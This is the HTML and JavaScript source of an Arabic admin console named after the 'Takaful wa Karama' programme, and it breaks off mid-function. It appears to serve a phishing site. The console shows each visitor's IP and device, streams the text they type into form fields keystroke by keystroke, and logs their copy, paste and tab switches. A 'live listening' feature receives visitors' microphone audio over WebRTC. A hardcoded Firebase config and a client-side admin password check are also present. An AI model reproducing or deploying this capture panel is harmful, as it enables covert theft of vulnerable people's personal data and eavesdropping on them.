<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تتبع مباشر — تكافل وكرامة</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #1a7a3c;
      --primary-dark: #145e2e;
      --bg: #0a0f1a;
      --panel: #111827;
      --card: #1e2533;
      --card-hover: #252d3e;
      --border: rgba(255,255,255,0.07);
      --text: #e2e8f0;
      --muted: #718096;
      --active-glow: #22c55e;
      --away-glow: #f59e0b;
      --left-glow: #64748b;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      overflow: hidden;
    }

    /* ── Login ─────────────────────────────────────────── */
    #loginScreen {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    }

    .login-box {
      background: white;
      border-radius: 20px;
      padding: 40px 36px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
      text-align: center;
      color: #1a202c;
    }

    .login-box .logo { font-size: 3rem; margin-bottom: 10px; }
    .login-box h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 4px; }
    .login-box p  { font-size: 0.85rem; color: #718096; margin-bottom: 24px; }

    .login-box input {
      width: 100%;
      padding: 12px 16px;
      border: 1.5px solid #e2e8f0;
      border-radius: 10px;
      font-size: 1rem;
      margin-bottom: 12px;
      outline: none;
      direction: ltr;
      text-align: left;
      font-family: inherit;
      transition: border-color 0.2s;
    }

    .login-box input:focus { border-color: var(--primary); }

    .login-btn {
      width: 100%;
      padding: 13px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      font-family: inherit;
      transition: opacity 0.2s;
    }

    .login-btn:hover { opacity: 0.9; }
    .login-error { color: #e53e3e; font-size: 0.85rem; margin-top: 10px; display: none; }

    /* ── App layout ─────────────────────────────────────── */
    #appScreen { display: none; flex-direction: column; height: 100vh; }

    /* Header */
    .app-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      height: 56px;
      background: var(--panel);
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
      gap: 12px;
    }

    .header-brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 0.95rem;
    }

    .live-dot {
      width: 10px; height: 10px;
      border-radius: 50%;
      background: #ef4444;
      box-shadow: 0 0 0 0 rgba(239,68,68,0.6);
      animation: pulse-red 1.5s ease-in-out infinite;
      flex-shrink: 0;
    }

    @keyframes pulse-red {
      0%   { box-shadow: 0 0 0 0 rgba(239,68,68,0.6); }
      70%  { box-shadow: 0 0 0 8px rgba(239,68,68,0); }
      100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); }
    }

    .live-badge {
      background: #ef4444;
      color: white;
      font-size: 0.7rem;
      font-weight: 700;
      padding: 1px 7px;
      border-radius: 20px;
    }

    .session-count {
      background: rgba(255,255,255,0.1);
      color: var(--text);
      font-size: 0.78rem;
      padding: 4px 10px;
      border-radius: 20px;
    }

    .header-actions { display: flex; align-items: center; gap: 8px; }

    .icon-btn {
      background: rgba(255,255,255,0.07);
      border: 1px solid var(--border);
      color: var(--text);
      border-radius: 8px;
      padding: 6px 12px;
      font-size: 0.8rem;
      cursor: pointer;
      font-family: inherit;
      transition: background 0.2s;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .icon-btn:hover { background: rgba(255,255,255,0.12); }
    .icon-btn.muted { opacity: 0.45; }

    /* Body split */
    .app-body {
      display: flex;
      flex: 1;
      overflow: hidden;
    }

    /* Sessions sidebar (right in RTL) */
    .sessions-panel {
      width: 300px;
      flex-shrink: 0;
      background: var(--panel);
      border-left: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .panel-header {
      padding: 14px 16px 10px;
      font-size: 0.78rem;
      font-weight: 700;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
    }

    .sessions-list {
      flex: 1;
      overflow-y: auto;
      padding: 8px;
    }

    .sessions-list::-webkit-scrollbar { width: 4px; }
    .sessions-list::-webkit-scrollbar-track { background: transparent; }
    .sessions-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }

    .session-card {
      background: var(--card);
      border-radius: 10px;
      padding: 12px;
      margin-bottom: 8px;
      cursor: pointer;
      border: 1.5px solid transparent;
      transition: all 0.2s;
      position: relative;
    }

    .session-card:hover { background: var(--card-hover); }
    .session-card.selected { border-color: var(--primary); background: var(--card-hover); }

    .session-card-top {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 6px;
    }

    .status-dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      flex-shrink: 0;
    }

    .status-dot.active {
      background: var(--active-glow);
      box-shadow: 0 0 6px var(--active-glow);
      animation: pulse-green 2s ease-in-out infinite;
    }

    .status-dot.away { background: var(--away-glow); }
    .status-dot.left { background: var(--left-glow); }

    @keyframes pulse-green {
      0%, 100% { box-shadow: 0 0 4px var(--active-glow); }
      50%       { box-shadow: 0 0 10px var(--active-glow); }
    }

    .session-ip {
      font-size: 0.82rem;
      font-weight: 700;
      color: var(--text);
      flex: 1;
      direction: ltr;
      text-align: right;
    }

    .session-device-icon { font-size: 1rem; }

    .session-delete {
      min-height: 28px;
      border: 1px solid rgba(239,68,68,0.28);
      background: rgba(239,68,68,0.1);
      color: #fca5a5;
      border-radius: 8px;
      padding: 4px 10px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
      font-family: inherit;
      font-size: 0.74rem;
      font-weight: 700;
      transition: background 0.2s, color 0.2s;
    }

    .session-delete:hover {
      background: rgba(239,68,68,0.22);
      color: #fecaca;
    }

    .session-card-actions {
      display: flex;
      justify-content: flex-end;
      margin-top: 8px;
    }

    .icon-btn.danger {
      border-color: rgba(239,68,68,0.35);
      color: #fca5a5;
      background: rgba(239,68,68,0.08);
    }

    .icon-btn.danger:hover { background: rgba(239,68,68,0.18); }

    .icon-btn.voice {
      border-color: rgba(20,184,166,0.38);
      color: #99f6e4;
      background: rgba(20,184,166,0.08);
    }

    .icon-btn.voice:hover,
    .icon-btn.voice.live { background: rgba(20,184,166,0.2); }

    .session-meta {
      display: flex;
      justify-content: space-between;
      font-size: 0.72rem;
      color: var(--muted);
      margin-bottom: 5px;
    }

    .session-field {
      font-size: 0.75rem;
      color: #a0aec0;
      background: rgba(255,255,255,0.05);
      padding: 3px 8px;
      border-radius: 6px;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      display: none;
    }

    .session-field.visible { display: block; }

    .empty-state {
      text-align: center;
      padding: 60px 20px;
      color: var(--muted);
    }

    .empty-state .icon { font-size: 2.5rem; margin-bottom: 10px; }
    .empty-state p { font-size: 0.85rem; }

    /* Events timeline (left/main) */
    .events-panel {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .events-header {
      padding: 14px 20px 10px;
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-shrink: 0;
    }

    .events-title {
      font-size: 0.85rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .events-subtitle {
      font-size: 0.75rem;
      color: var(--muted);
    }

    .events-actions {
      display: flex;
      align-items: center;
      gap: 8px;
      flex-shrink: 0;
    }

    .events-feed {
      flex: 1;
      overflow-y: auto;
      padding: 16px 20px;
    }

    .events-feed::-webkit-scrollbar { width: 4px; }
    .events-feed::-webkit-scrollbar-track { background: transparent; }
    .events-feed::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }

    .event-row {
      display: flex;
      gap: 10px;
      margin-bottom: 8px;
      align-items: flex-start;
      animation: fadeSlide 0.3s ease;
    }

    @keyframes fadeSlide {
      from { opacity: 0; transform: translateY(6px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .event-time {
      font-size: 0.7rem;
      color: var(--muted);
      white-space: nowrap;
      padding-top: 3px;
      direction: ltr;
      flex-shrink: 0;
      width: 54px;
      text-align: left;
    }

    .event-icon {
      width: 28px; height: 28px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.85rem;
      flex-shrink: 0;
    }

    .event-body {
      flex: 1;
      background: var(--card);
      border-radius: 8px;
      padding: 8px 12px;
      border-right: 3px solid transparent;
    }

    .event-label {
      font-size: 0.78rem;
      color: var(--muted);
      margin-bottom: 2px;
    }

    .event-value {
      font-size: 0.88rem;
      font-weight: 600;
      color: var(--text);
      word-break: break-all;
    }

    /* Event type colors */
    .ev-page_load    .event-icon { background: rgba(99,102,241,0.15); }
    .ev-page_load    .event-body { border-color: #6366f1; }
    .ev-field_focus  .event-icon { background: rgba(59,130,246,0.15); }
    .ev-field_focus  .event-body { border-color: #3b82f6; }
    .ev-field_input  .event-icon { background: rgba(34,197,94,0.15); }
    .ev-field_input  .event-body { border-color: #22c55e; }
    .ev-field_blur   .event-icon { background: rgba(100,116,139,0.15); }
    .ev-field_blur   .event-body { border-color: #64748b; }
    .ev-radio_change .event-icon { background: rgba(245,158,11,0.15); }
    .ev-radio_change .event-body { border-color: #f59e0b; }
    .ev-form_submit  .event-icon { background: rgba(34,197,94,0.2); }
    .ev-form_submit  .event-body { border-color: #16a34a; }
    .ev-inquiry      .event-icon { background: rgba(168,85,247,0.15); }
    .ev-inquiry      .event-body { border-color: #a855f7; }
    .ev-visibility_hidden  .event-icon { background: rgba(239,68,68,0.1); }
    .ev-visibility_hidden  .event-body { border-color: #ef4444; }
    .ev-visibility_visible .event-icon { background: rgba(34,197,94,0.1); }
    .ev-visibility_visible .event-body { border-color: #22c55e; }
    .ev-page_unload  .event-icon { background: rgba(239,68,68,0.15); }
    .ev-page_unload  .event-body { border-color: #dc2626; }
    .ev-heartbeat    .event-icon { background: rgba(20,184,166,0.1); }
    .ev-heartbeat    .event-body { border-color: #14b8a6; }
    .ev-scroll_depth .event-icon { background: rgba(14,165,233,0.15); }
    .ev-scroll_depth .event-body { border-color: #0ea5e9; }
    .ev-text_select  .event-icon { background: rgba(217,70,239,0.15); }
    .ev-text_select  .event-body { border-color: #d946ef; }
    .ev-button_click .event-icon { background: rgba(245,158,11,0.18); }
    .ev-button_click .event-body { border-color: #f59e0b; }
    .ev-link_click   .event-icon { background: rgba(59,130,246,0.16); }
    .ev-link_click   .event-body { border-color: #3b82f6; }
    .ev-field_change .event-icon { background: rgba(34,197,94,0.15); }
    .ev-field_change .event-body { border-color: #22c55e; }
    .ev-copy .event-icon,
    .ev-cut .event-icon,
    .ev-paste .event-icon { background: rgba(148,163,184,0.15); }
    .ev-copy .event-body,
    .ev-cut .event-body,
    .ev-paste .event-body { border-color: #94a3b8; }

    /* No session selected */
    .no-session {
      display: flex;
      flex: 1;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      color: var(--muted);
      gap: 12px;
    }

    .no-session .ns-icon { font-size: 3rem; opacity: 0.3; }
    .no-session p { font-size: 0.88rem; }

    /* Loading spinner */
    .spin {
      display: inline-block;
      width: 20px; height: 20px;
      border: 2px solid rgba(255,255,255,0.15);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    /* Notification toast */
    .notif {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%) translateY(80px);
      background: var(--primary);
      color: white;
      padding: 10px 20px;
      border-radius: 30px;
      font-size: 0.88rem;
      font-weight: 700;
      transition: transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
      z-index: 9999;
      pointer-events: none;
      white-space: nowrap;
    }

    .notif.show { transform: translateX(-50%) translateY(0); }

    @keyframes pulse-sound {
      0%, 100% { background: rgba(255,255,255,0.07); }
      50%       { background: rgba(239,68,68,0.35); border-color: #ef4444; }
    }

    @media (max-width: 640px) {
      .sessions-panel { width: 240px; }
    }
  </style>
</head>
<body>

<!-- Login -->
<div id="loginScreen">
  <div class="login-box">
    <div class="logo">👁️</div>
    <h2>مراقبة المستخدمين</h2>
    <p>تتبع مباشر — تكافل وكرامة</p>
    <input type="text" id="loginUser" placeholder="اسم المستخدم" autocomplete="off">
    <input type="password" id="loginPass" placeholder="كلمة المرور">
    <button class="login-btn" onclick="doLogin()">دخول</button>
    <div class="login-error" id="loginError">❌ بيانات غير صحيحة</div>
  </div>
</div>

<!-- App -->
<div id="appScreen">
  <header class="app-header">
    <div class="header-brand">
      <div class="live-dot"></div>
      <span class="live-badge">LIVE</span>
      <span>تتبع المستخدمين</span>
      <span class="session-count" id="sessionCount">0 جلسة</span>
    </div>
    <div class="header-actions">
      <button class="icon-btn" id="soundBtn" onclick="toggleSound()">🔔 الصوت</button>
      <a href="admin.html" class="icon-btn" style="text-decoration:none;">← الإدارة</a>
      <button class="icon-btn" onclick="doLogout()">خروج</button>
    </div>
  </header>

  <div class="app-body">

    <!-- Events panel (left in RTL) -->
    <div class="events-panel">
      <div id="noSession" class="no-session">
        <div class="ns-icon">🖱️</div>
        <p>اختر جلسة لعرض أحداثها</p>
      </div>

      <div id="eventsView" style="display:none; flex-direction:column; flex:1; overflow:hidden;">
        <div class="events-header">
          <div>
            <div class="events-title" id="eventsTitle">اختر جلسة</div>
            <div class="events-subtitle" id="eventsSubtitle"></div>
          </div>
          <div class="events-actions">
            <button class="icon-btn voice" id="voiceListenBtn" onclick="toggleAdminVoice()">🎧 استماع مباشر</button>
            <button class="icon-btn danger" onclick="deleteSession(event)">🗑 حذف الجلسة</button>
            <button class="icon-btn" onclick="clearSelection()">✕ إغلاق</button>
          </div>
        </div>
        <div class="events-feed" id="eventsFeed"></div>
      </div>
    </div>

    <!-- Sessions panel (right in RTL = appears first in flex) -->
    <div class="sessions-panel">
      <div class="panel-header">الجلسات النشطة</div>
      <div class="sessions-list" id="sessionsList">
        <div class="empty-state">
          <div class="icon">🌐</div>
          <p>لا توجد جلسات حالياً</p>
          <p style="margin-top:6px;font-size:0.72rem;">ستظهر هنا عند دخول أي زائر</p>
        </div>
      </div>
    </div>

  </div>
</div>

<div class="notif" id="notif"></div>
<audio id="liveAudio" autoplay playsinline></audio>

<script type="module">
  import { initializeApp }          from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
  import { getFirestore, doc,
           getDoc, collection,
           query, orderBy,
           onSnapshot,
           deleteDoc,
           addDoc, setDoc,
           updateDoc }              from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBKYhw1mfkNWVvWI9GZrKQsRsgCXbtflUI",
    authDomain: "gogerexams.firebaseapp.com",
    projectId: "gogerexams",
    storageBucket: "gogerexams.firebasestorage.app",
    messagingSenderId: "261975684495",
    appId: "1:261975684495:web:7254477c2658b62817c7fa"
  };

  const app = initializeApp(firebaseConfig);
  const db  = getFirestore(app);

  // ── State ────────────────────────────────────────────────
  const SOUND_PREF_KEY = 'tracker_sound_enabled';
  let soundEnabled  = localStorage.getItem(SOUND_PREF_KEY) !== '0';
  let soundUnlocked = localStorage.getItem(SOUND_PREF_KEY) === '1';
  let selectedSid   = null;
  let eventsUnsub   = null;
  let sessionsUnsub = null;
  let knownSids     = new Set();
  let sessions      = {};   // sid → data

  const RTC_CONFIG = {
    iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
  };

  let adminVoicePc = null;
  let adminVoiceSid = null;
  let adminVoiceUnsubs = [];

  const EVENT_ICONS = {
    page_load:          '🌐',
    field_focus:        '🖊',
    field_input:        '✏️',
    field_blur:         '↩',
    radio_change:       '🔘',
    form_submit:        '✅',
    inquiry:            '🔍',
    visibility_hidden:  '😴',
    visibility_visible: '👁',
    page_unload:        '🚪',
    heartbeat:          '💓',
    scroll_depth:       '📜',
    text_select:        '🔎',
    button_click:       '👆',
    link_click:         '🔗',
    field_change:       '🔁',
    copy:               '📋',
    cut:                '✂️',
    paste:              '📥',
  };

  const EVENT_LABELS = {
    page_load:          'فتح الصفحة',
    field_focus:        'نقر على حقل',
    field_input:        'كتابة في الحقل',
    field_blur:         'خروج من الحقل',
    radio_change:       'تغيير الاختيار',
    form_submit:        'إرسال النموذج',
    inquiry:            'استعلام',
    visibility_hidden:  'غادر التبويب',
    visibility_visible: 'عاد للتبويب',
    page_unload:        'أغلق الصفحة',
    heartbeat:          'إشارة حياة',
    scroll_depth:       'قام بالتمرير',
    text_select:        'حدد نصاً',
    button_click:       'ضغط زر',
    link_click:         'ضغط رابط',
    field_change:       'غيّر قيمة',
    copy:               'نسخ',
    cut:                'قص',
    paste:              'لصق',
  };

  // ── Audio ─────────────────────────────────────────────────
  let audioCtx = null;

  function getAudioCtx() {
    if (!audioCtx) {
      try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } catch (_) {}
    }
    return audioCtx;
  }

  async function unlockAudio() {
    const ctx = getAudioCtx();
    if (!ctx) return;
    if (ctx.state === 'suspended') {
      try { await ctx.resume(); } catch (_) {}
    }
  }

  function playBeep() {
    if (!soundEnabled) return;
    const ctx = getAudioCtx();
    if (!ctx || ctx.state !== 'running') return;
    try {
      [600, 900].forEach((freq, i) => {
        const osc  = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = freq;
        osc.type = 'sine';
        gain.gain.setValueAtTime(0.35, ctx.currentTime + i * 0.12);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
        osc.start(ctx.currentTime + i * 0.12);
        osc.stop(ctx.currentTime + i * 0.12 + 0.35);
      });
    } catch (_) {}
  }

  function updateSoundBtn() {
    const btn = document.getElementById('soundBtn');
    if (!soundEnabled) {
      btn.textContent = '🔕 صامت';
      btn.classList.add('muted');
    } else if (soundUnlocked && (!audioCtx || audioCtx.state !== 'running')) {
      btn.textContent = '🔔 الصوت محفوظ — انقر لإعادة التفعيل';
      btn.classList.remove('muted');
    } else if (!audioCtx || audioCtx.state !== 'running') {
      btn.textContent = '🔔 انقر لتفعيل الصوت';
      btn.classList.remove('muted');
    } else {
      btn.textContent = '🔔 الصوت مفعّل';
      btn.classList.remove('muted');
    }
  }

  window.toggleSound = async () => {
    if (!soundEnabled) {
      soundEnabled = true;
      await unlockAudio();
      soundUnlocked = !!audioCtx && audioCtx.state === 'running';
      localStorage.setItem(SOUND_PREF_KEY, '1');
      playBeep();
    } else if (!audioCtx || audioCtx.state !== 'running') {
      await unlockAudio();
      soundUnlocked = !!audioCtx && audioCtx.state === 'running';
      localStorage.setItem(SOUND_PREF_KEY, '1');
      playBeep();
    } else {
      soundEnabled = !soundEnabled;
      soundUnlocked = soundEnabled;
      localStorage.setItem(SOUND_PREF_KEY, soundEnabled ? '1' : '0');
    }
    updateSoundBtn();
  };

  // ── Notification toast ────────────────────────────────────
  function showNotif(msg) {
    const el = document.getElementById('notif');
    el.textContent = msg;
    el.classList.add('show');
    setTimeout(() => el.classList.remove('show'), 3500);
  }

  // ── Login ─────────────────────────────────────────────────
  window.doLogin = async () => {
    const u = document.getElementById('loginUser').value.trim();
    const p = document.getElementById('loginPass').value.trim();
    const errEl = document.getElementById('loginError');
    errEl.style.display = 'none';

    try {
      const snap = await getDoc(doc(db, 'settings', 'admin'));
      if (!snap.exists()) { errEl.style.display = 'block'; return; }
      const { userAdmin, passAdmin } = snap.data();
      if (u !== String(userAdmin ?? '').trim() || p !== String(passAdmin ?? '').trim()) { errEl.style.display = 'block'; return; }

      sessionStorage.setItem('admin_authenticated', '1');
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('appScreen').style.display   = 'flex';
      await unlockAudio();
      updateSoundBtn();
      startListening();
    } catch {
      errEl.style.display = 'block';
    }
  };

  window.doLogout = () => {
    sessionStorage.removeItem('admin_authenticated');
    localStorage.removeItem('admin_authenticated');
    location.reload();
  };

  // Allow Enter key on login
  ['loginUser', 'loginPass'].forEach(id => {
    document.getElementById(id).addEventListener('keydown', e => {
      if (e.key === 'Enter') window.doLogin();
    });
  });

  // Auto-login if already authenticated in admin
  if (sessionStorage.getItem('admin_authenticated') === '1' || localStorage.getItem('admin_authenticated') === '1') {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('appScreen').style.display   = 'flex';
    // الصوت يحتاج تفاعل — يُفعَّل عند أول ضغط على زر الصوت
    updateSoundBtn();
    startListening();
  }

  // ── Helpers ────────────────────────────────────────────────
  function elapsed(seconds) {
    if (!seconds) return '';
    const diff = Math.floor(Date.now() / 1000) - seconds;
    if (diff < 60)   return `${diff}ث`;
    if (diff < 3600) return `${Math.floor(diff/60)}د`;
    return `${Math.floor(diff/3600)}س`;
  }

  function deviceIcon(d) {
    if (!d) return '💻';
    if (/Android|iPhone|iPad|Mobile/i.test(d)) return '📱';
    if (/Windows|Mac|Linux/i.test(d)) return '💻';
    return '🌐';
  }

  function statusLabel(s) {
    if (s === 'active') return 'نشط';
    if (s === 'away')   return 'بعيد';
    return 'خرج';
  }

  function actionLabel(action) {
    return EVENT_LABELS[action] || action || '';
  }

  function fmtTime(ts) {
    if (!ts?.seconds) return '';
    return new Date(ts.seconds * 1000).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  }

  // ── Session cards ──────────────────────────────────────────
  function renderSessions() {
    const list = document.getElementById('sessionsList');
    const all  = Object.entries(sessions);

    if (all.length === 0) {
      list.innerHTML = `<div class="empty-state"><div class="icon">🌐</div><p>لا توجد جلسات حالياً</p><p style="margin-top:6px;font-size:0.72rem;">ستظهر هنا عند دخول أي زائر</p></div>`;
      document.getElementById('sessionCount').textContent = '0 جلسة';
      return;
    }

    // Sort: active → away → left, then by lastSeen desc
    const sorted = all.sort(([,a],[,b]) => {
      const order = { active: 0, away: 1, left: 2 };
      const oa = order[a.status] ?? 2;
      const ob = order[b.status] ?? 2;
      if (oa !== ob) return oa - ob;
      return (b.lastSeen?.seconds ?? 0) - (a.lastSeen?.seconds ?? 0);
    });

    const activeCount = all.filter(([,d]) => d.status === 'active').length;
    document.getElementById('sessionCount').textContent = `${activeCount} نشط / ${all.length} إجمالي`;

    list.innerHTML = sorted.map(([sid, d]) => {
      const icon    = deviceIcon(d.userAgent || d.os);
      const status  = d.status || 'left';
      const field   = d.currentField ? `<div class="session-field visible">✏️ ${escHtml(String(d.currentField))}</div>` : '';
      const actionText = d.lastAction
        ? `${actionLabel(d.lastAction)}${d.scrollDepth ? ` · ${d.scrollDepth}%` : ''}`
        : '';
      const action = actionText ? `<div class="session-field visible">⚡ ${escHtml(actionText)}</div>` : '';
      const sel     = sid === selectedSid ? 'selected' : '';
      return `
        <div class="session-card ${sel}" onclick="selectSession('${sid}')">
          <div class="session-card-top">
            <div class="status-dot ${status}"></div>
            <div class="session-ip">${d.ip || '—'}</div>
            <div class="session-device-icon">${icon}</div>
          </div>
          <div class="session-meta">
            <span>${d.browser || '?'} / ${d.os || '?'}</span>
            <span>${elapsed(d.lastSeen?.seconds)}</span>
          </div>
          ${field}
          ${action}
          <div class="session-card-actions">
            <button class="session-delete" type="button" title="حذف الجلسة" onclick="deleteSession(event, '${sid}')">🗑 حذف الجلسة</button>
          </div>
        </div>`;
    }).join('');
  }

  // ── Select session ─────────────────────────────────────────
  window.selectSession = (sid) => {
    selectedSid = sid;
    renderSessions();
    loadEvents(sid);
    updateVoiceListenBtn();
  };

  window.clearSelection = () => {
    if (adminVoicePc && adminVoiceSid === selectedSid) stopAdminVoice('selection_closed');
    selectedSid = null;
    if (eventsUnsub) { eventsUnsub(); eventsUnsub = null; }
    document.getElementById('eventsView').style.display  = 'none';
    document.getElementById('noSession').style.display   = 'flex';
    renderSessions();
    updateVoiceListenBtn();
  };

  window.deleteSession = async (e, sid = selectedSid) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    if (!sid) return;

    const d = sessions[sid] || {};
    const label = d.ip || sid;
    if (!confirm(`حذف جلسة ${label}؟`)) return;

    try {
      await deleteDoc(doc(db, 'LiveSessions', sid));
      delete sessions[sid];
      knownSids.delete(sid);
      if (selectedSid === sid) clearSelection();
      renderSessions();
      showNotif('تم حذف الجلسة');
    } catch (err) {
      showNotif('تعذر حذف الجلسة — تحقق من صلاحيات Firebase');
    }
  };

  function updateVoiceListenBtn() {
    const btn = document.getElementById('voiceListenBtn');
    if (!btn) return;
    if (adminVoicePc && adminVoiceSid === selectedSid) {
      btn.textContent = '🔴 إنهاء الاستماع';
      btn.classList.add('live');
    } else {
      btn.textContent = '🎧 استماع مباشر';
      btn.classList.remove('live');
    }
  }

  function stopAdminVoice(status = 'admin_stopped') {
    adminVoiceUnsubs.forEach(unsub => {
      try { unsub(); } catch (_) {}
    });
    adminVoiceUnsubs = [];
    if (adminVoicePc) {
      try { adminVoicePc.close(); } catch (_) {}
      adminVoicePc = null;
    }
    const audio = document.getElementById('liveAudio');
    if (audio) audio.srcObject = null;
    if (adminVoiceSid) {
      updateDoc(doc(db, 'LiveAudio', adminVoiceSid), {
        status,
        updatedAt: new Date()
      }).catch(() => {});
    }
    adminVoiceSid = null;
    updateVoiceListenBtn();
  }

  window.toggleAdminVoice = async () => {
    if (!selectedSid) return;
    if (adminVoicePc && adminVoiceSid === selectedSid) {
      stopAdminVoice();
      showNotif('تم إنهاء الاستماع');
      return;
    }

    stopAdminVoice('switched_session');
    const sid = selectedSid;
    const callRef = doc(db, 'LiveAudio', sid);
    const callerCandidates = collection(db, 'LiveAudio', sid, 'callerCandidates');
    const calleeCandidates = collection(db, 'LiveAudio', sid, 'calleeCandidates');

    try {
      const callSnap = await getDoc(callRef);
      const callData = callSnap.data();
      if (!callData?.offer) {
        showNotif('لا يوجد بث صوتي مفتوح لهذه الجلسة');
        return;
      }

      adminVoiceSid = sid;
      adminVoicePc = new RTCPeerConnection(RTC_CONFIG);

      adminVoicePc.ontrack = e => {
        const audio = document.getElementById('liveAudio');
        if (!audio) return;
        audio.srcObject = e.streams[0];
        audio.play().catch(() => showNotif('اضغط استماع مرة أخرى لتشغيل الصوت'));
      };

      adminVoicePc.onicecandidate = e => {
        if (e.candidate) addDoc(calleeCandidates, e.candidate.toJSON()).catch(() => {});
      };

      adminVoicePc.onconnectionstatechange = () => {
        if (['failed', 'disconnected', 'closed'].includes(adminVoicePc?.connectionState)) {
          stopAdminVoice('disconnected');
        }
      };

      await adminVoicePc.setRemoteDescription(new RTCSessionDescription(callData.offer));
      const answer = await adminVoicePc.createAnswer();
      await adminVoicePc.setLocalDescription(answer);

      await setDoc(callRef, {
        answer: { type: answer.type, sdp: answer.sdp },
        status: 'connected',
        adminConnectedAt: new Date()
      }, { merge: true });

      adminVoiceUnsubs.push(onSnapshot(callerCandidates, snap => {
        snap.docChanges().forEach(change => {
          if (change.type === 'added' && adminVoicePc) {
            adminVoicePc.addIceCandidate(new RTCIceCandidate(change.doc.data())).catch(() => {});
          }
        });
      }));

      adminVoiceUnsubs.push(onSnapshot(callRef, snap => {
        const data = snap.data();
        if (['ended', 'ended_by_visitor', 'permission_denied'].includes(data?.status)) {
          stopAdminVoice(data.status);
          showNotif('انتهى البث الصوتي من المستخدم');
        }
      }));

      updateVoiceListenBtn();
      showNotif('جارٍ الاتصال بالبث الصوتي...');
    } catch (err) {
      stopAdminVoice('admin_error');
      showNotif('تعذر تشغيل البث الصوتي');
    }
  };

  // ── Load events for a session ──────────────────────────────
  function loadEvents(sid) {
    if (eventsUnsub) eventsUnsub();

    document.getElementById('noSession').style.display   = 'none';
    document.getElementById('eventsView').style.display  = 'flex';
    document.getElementById('eventsFeed').innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted);"><div class="spin"></div></div>';

    const d = sessions[sid] || {};
    document.getElementById('eventsTitle').textContent    = d.ip || sid;
    document.getElementById('eventsSubtitle').textContent = `${d.browser || ''} · ${d.os || ''} · ${d.screenRes || ''}`;

    const evCol = collection(db, 'LiveSessions', sid, 'Events');
    const q     = query(evCol, orderBy('ts', 'asc'));

    eventsUnsub = onSnapshot(q, snap => {
      const feed = document.getElementById('eventsFeed');
      feed.innerHTML = '';

      if (snap.empty) {
        feed.innerHTML = '<div style="text-align:center;padding:40px;color:var(--muted);">لا توجد أحداث بعد</div>';
        return;
      }

      snap.forEach(doc => {
        const ev = doc.data();
        feed.appendChild(buildEventRow(ev));
      });

      feed.scrollTop = feed.scrollHeight;
    });
  }

  function buildEventRow(ev) {
    const div = document.createElement('div');
    div.className = `event-row ev-${ev.type}`;
    const icon      = EVENT_ICONS[ev.type]  || '•';
    const typeLabel = EVENT_LABELS[ev.type] || ev.type;
    const time      = fmtTime(ev.ts);

    // السطر الأول: اسم الحقل (إن وُجد)، وإلا نوع الحدث
    const topLine = ev.label
      ? `<div class="event-label">${escHtml(ev.label)}</div>`
      : `<div class="event-label" style="color:var(--muted)">${typeLabel}</div>`;

    // السطر الثاني: القيمة المكتوبة (إن وُجدت)، وإلا وصف الحدث بلون خافت
    const hasValue = ev.value && ev.value !== 'null';
    const bottomLine = hasValue
      ? `<div class="event-value">${escHtml(String(ev.value))}</div>`
      : `<div class="event-value" style="color:var(--muted);font-weight:400;">${typeLabel}</div>`;

    div.innerHTML = `
      <div class="event-time">${time}</div>
      <div class="event-icon">${icon}</div>
      <div class="event-body">
        ${topLine}
        ${bottomLine}
      </div>`;
